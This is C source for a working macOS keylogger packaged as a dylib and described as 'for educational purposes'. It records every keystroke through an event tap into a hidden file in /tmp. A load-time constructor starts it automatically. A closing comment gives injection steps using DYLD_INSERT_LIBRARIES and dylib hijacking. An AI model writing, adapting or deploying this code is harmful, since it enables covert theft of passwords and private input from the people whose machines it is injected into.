//
// Advanced Dylib Keylogger Template
//
// This dylib demonstrates how an attacker might use dylib injection
// to implement a keylogger on macOS.
//
// FOR EDUCATIONAL PURPOSES ONLY.
//
// Compilation:
// gcc -dynamiclib -framework Cocoa -framework Carbon keylogger_dylib.c -o keylogger.dylib
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <syslog.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>

// macOS specific headers
#include <CoreFoundation/CoreFoundation.h>
#include <Carbon/Carbon.h>
#include <ApplicationServices/ApplicationServices.h>

// Configuration constants
#define LOG_FILE "/tmp/.keylog.txt"
#define MAX_LOG_SIZE 1024 * 1024 * 5  // 5MB max log size
#define PERSIST_INTERVAL 30           // Write to disk every 30 seconds

// Global variables
static FILE* log_file = NULL;
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
static char buffer[1024] = {0};
static int buffer_pos = 0;
static pthread_t keylogger_thread;
static pthread_t persist_thread;
static int running = 0;

// Forward declarations
static void log_key(char* key);
static void* persistence_thread(void* arg);

// Function to get current timestamp
char* get_timestamp() {
    time_t t = time(NULL);
    struct tm* tm_info = localtime(&t);
    static char buffer[64];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", tm_info);
    return buffer;
}

// Function to open log file
void open_log_file() {
    if (log_file != NULL) return;
    
    log_file = fopen(LOG_FILE, "a");
    if (log_file == NULL) {
        syslog(LOG_ERR, "Failed to open keylog file");
        return;
    }
    
    fprintf(log_file, "\n\n[%s] --- Keylogger started for %s (PID: %d) ---\n\n", 
            get_timestamp(), getprogname(), getpid());
    fflush(log_file);
}

// Keylogger callback function
CGEventRef key_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }
    
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        
        // Get keyboard layout
        TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardLayoutInputSource();
        CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
        
        if (layoutData) {
            const UCKeyboardLayout* keyboardLayout = (const UCKeyboardLayout*)CFDataGetBytePtr(layoutData);
            
            UInt32 keysDown = 0;
            UniChar chars[4];
            UniCharCount realLength = 0;
            
            UCKeyTranslate(keyboardLayout, keyCode, kUCKeyActionDown, 0, 
                          LMGetKbdType(), 0, &keysDown, sizeof(chars) / sizeof(chars[0]), 
                          &realLength, chars);
            
            if (realLength > 0) {
                char buffer[5] = {0};
                for (int i = 0; i < realLength; i++) {
                    buffer[i] = (char)chars[i];
                }
                log_key(buffer);
            }
        }
        
        if (currentKeyboard) {
            CFRelease(currentKeyboard);
        }
    } else if (type == kCGEventFlagsChanged) {
        CGEventFlags flags = CGEventGetFlags(event);
        
        // Check if modifier keys were pressed
        if (flags & kCGEventFlagMaskShift) {
            log_key("[SHIFT]");
        }
        if (flags & kCGEventFlagMaskControl) {
            log_key("[CTRL]");
        }
        if (flags & kCGEventFlagMaskAlternate) {
            log_key("[ALT]");
        }
        if (flags & kCGEventFlagMaskCommand) {
            log_key("[CMD]");
        }
    }
    
    // Pass event to next application
    return event;
}

// Function to log a key
static void log_key(char* key) {
    pthread_mutex_lock(&log_mutex);
    
    // Special key handling for readability
    if (strcmp(key, "\r") == 0 || strcmp(key, "\n") == 0) {
        strcat(buffer, " [ENTER] \n");
        buffer_pos += 10;
    } else if (strcmp(key, "\t") == 0) {
        strcat(buffer, " [TAB] ");
        buffer_pos += 7;
    } else if (strcmp(key, " ") == 0) {
        strcat(buffer, " ");
        buffer_pos += 1;
    } else if (strcmp(key, "\b") == 0) {
        strcat(buffer, " [BACKSPACE] ");
        buffer_pos += 13;
    } else {
        strcat(buffer, key);
        buffer_pos += strlen(key);
    }
    
    // If buffer is getting full, write to file
    if (buffer_pos > sizeof(buffer) - 20) {
        open_log_file();
        if (log_file) {
            fprintf(log_file, "%s", buffer);
            fflush(log_file);
        }
        
        // Reset buffer
        memset(buffer, 0, sizeof(buffer));
        buffer_pos = 0;
    }
    
    pthread_mutex_unlock(&log_mutex);
}

// Thread for periodically writing buffer to disk
static void* persistence_thread(void* arg) {
    while (running) {
        sleep(PERSIST_INTERVAL);
        
        pthread_mutex_lock(&log_mutex);
        
        // Only write if there's data in buffer
        if (buffer_pos > 0) {
            open_log_file();
            if (log_file) {
                fprintf(log_file, "%s", buffer);
                fflush(log_file);
                
                // Check log file size and rotate if needed
                fseek(log_file, 0, SEEK_END);
                long size = ftell(log_file);
                if (size > MAX_LOG_SIZE) {
                    fclose(log_file);
                    
                    // Create backup filename with timestamp
                    char backup[256];
                    snprintf(backup, sizeof(backup), "%s.%ld", LOG_FILE, time(NULL));
                    rename(LOG_FILE, backup);
                    
                    // Open new log file
                    log_file = fopen(LOG_FILE, "w");
                    fprintf(log_file, "[%s] --- Log rotated ---\n\n", get_timestamp());
                }
            }
            
            // Reset buffer
            memset(buffer, 0, sizeof(buffer));
            buffer_pos = 0;
        }
        
        pthread_mutex_unlock(&log_mutex);
    }
    
    return NULL;
}

// Function to start keylogger
void start_keylogger() {
    if (running) return;
    running = 1;
    
    // Set file permissions to be only readable by the current user
    umask(0077);
    
    // Open log file
    open_log_file();
    
    // Start persistence thread
    pthread_create(&persist_thread, NULL, persistence_thread, NULL);
    
    // Start keylogger
    CFRunLoopSourceRef runLoopSource;
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, 
                                             eventMask, key_callback, NULL);
    
    if (!eventTap) {
        syslog(LOG_ERR, "Failed to create event tap");
        return;
    }
    
    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    
    // Log success
    syslog(LOG_ERR, "Keylogger started for %s (PID: %d)", getprogname(), getpid());
    
    // Start run loop in a new thread
    CFRunLoopRun();
}

// Function to stop keylogger
void stop_keylogger() {
    if (!running) return;
    
    running = 0;
    
    // Stop run loop
    CFRunLoopStop(CFRunLoopGetCurrent());
    
    // Join persistence thread
    pthread_join(persist_thread, NULL);
    
    // Final flush of buffer
    pthread_mutex_lock(&log_mutex);
    if (buffer_pos > 0 && log_file) {
        fprintf(log_file, "%s", buffer);
        fprintf(log_file, "\n\n[%s] --- Keylogger stopped ---\n", get_timestamp());
        fflush(log_file);
    }
    pthread_mutex_unlock(&log_mutex);
    
    // Close log file
    if (log_file) {
        fclose(log_file);
        log_file = NULL;
    }
    
    syslog(LOG_ERR, "Keylogger stopped for %s (PID: %d)", getprogname(), getpid());
}

// Function that runs when the dylib is loaded
__attribute__((constructor))
static void initialize(int argc, const char **argv) {
    // Start keylogger in a separate thread
    pthread_create(&keylogger_thread, NULL, (void *(*)(void *))start_keylogger, NULL);
    
    // Log initialization success
    syslog(LOG_ERR, "Keylogger dylib injected into %s (PID: %d)", getprogname(), getpid());
}

// Function that runs when the dylib is unloaded
__attribute__((destructor))
static void cleanup(void) {
    // Stop keylogger
    stop_keylogger();
    
    // Join thread
    pthread_join(keylogger_thread, NULL);
    
    syslog(LOG_ERR, "Keylogger dylib unloaded from %s (PID: %d)", getprogname(), getpid());
}

/*
 * Installation instructions:
 * 
 * 1. Compile this dylib:
 *    gcc -dynamiclib -framework Cocoa -framework Carbon keylogger_dylib.c -o keylogger.dylib
 * 
 * 2. Choose a target application and inject using one of these methods:
 * 
 *    a) Environment variable injection:
 *       DYLD_INSERT_LIBRARIES=./keylogger.dylib /path/to/target/application
 * 
 *    b) Dylib hijacking:
 *       - Find a dylib that the application loads but doesn't exist
 *       - Rename keylogger.dylib to match the missing dylib's name
 *       - Place it in the correct location
 * 
 * 3. Check the log file at /tmp/.keylog.txt
 *
 * NOTES:
 * - Root privileges may be required to capture keystrokes globally
 * - This keylogger only works while the target application is in focus
 * - For educational purposes only!
 */